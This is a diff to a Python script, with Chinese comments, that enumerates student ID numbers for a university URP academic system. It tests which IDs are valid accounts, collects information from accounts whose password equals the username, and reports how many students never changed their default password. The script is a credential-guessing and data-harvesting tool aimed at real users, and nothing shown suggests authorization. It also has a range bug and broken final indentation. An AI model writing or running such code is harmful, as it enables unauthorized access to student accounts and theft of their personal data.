@@ -21,19 +21,24 @@ class InfoAccount(object):
 		# 理工
 		separator = settings.URP_SEPARATOR
 		# 学部
-		college = [range(settings.URP_COLLEGE_START, settings.URP_COLLEGE_END + 1)]
+		college = range(settings.URP_COLLEGE_START, settings.URP_COLLEGE_END + 1)
 		# 专业
-		sub = [range(settings.URP_MAJOR_START, settings.URP_MAJOR_END + 1)]
+		major = range(settings.URP_MAJOR_START, settings.URP_MAJOR_END + 1)
+		# 班级
+		clazz = range(settings.URP_CLASS_START, settings.URP_COLLEGE_END + 1)
+		# 学号
+		stu = range(settings.URP_STU_START, settings.URP_STU_END + 1)
 
+		# 生成学号
 		for c in college:
-			for s in sub:
-				pre = str(grade) + separator + c + s
-				for i in range(1, 300):
-					username = pre + str(i).zfill(3)
-					self.accounts.append(username)
+			for m in major:
+				for cl in clazz:
+					for s in stu:
+						stuid = str(grade).zfill(2) + separator + str(c).zfill(2) + str(m).zfill(2) + str(cl) + str(
+							s).zfill(2)
+						self.accounts.append(stuid)  # 账号校验器
 
 
-# 账号校验器
 class InfoValidate(object):
 	def __init__(self):
 		self.http = urllib3.PoolManager()
@@ -117,8 +122,19 @@ class InfoMain(object):
 		print(validator.account_available)
 		collector = InfoCollect()
 		collector.get_info(validator.account_available)
+		# 计算
+		num_sum = account.accounts.__len__()
+		num_valid = validator.account_valid.__len__()
+		num_available = validator.account_available.__len__()
+		str_num_rate = "%.2f%%" % ((num_available / num_valid) * 100)
+		print('总共尝试：{} 次，其中有效账号：{} 个，有效账号中用户名和密码一致的账号：{} 个，未修改密码的比例为：{}'.format(
+			num_sum,
+			num_valid,
+			num_available,
+			str_num_rate
+		))
 
 
 if __name__ == '__main__':
 	app = InfoMain()
-	app.autorun()
+app.autorun()
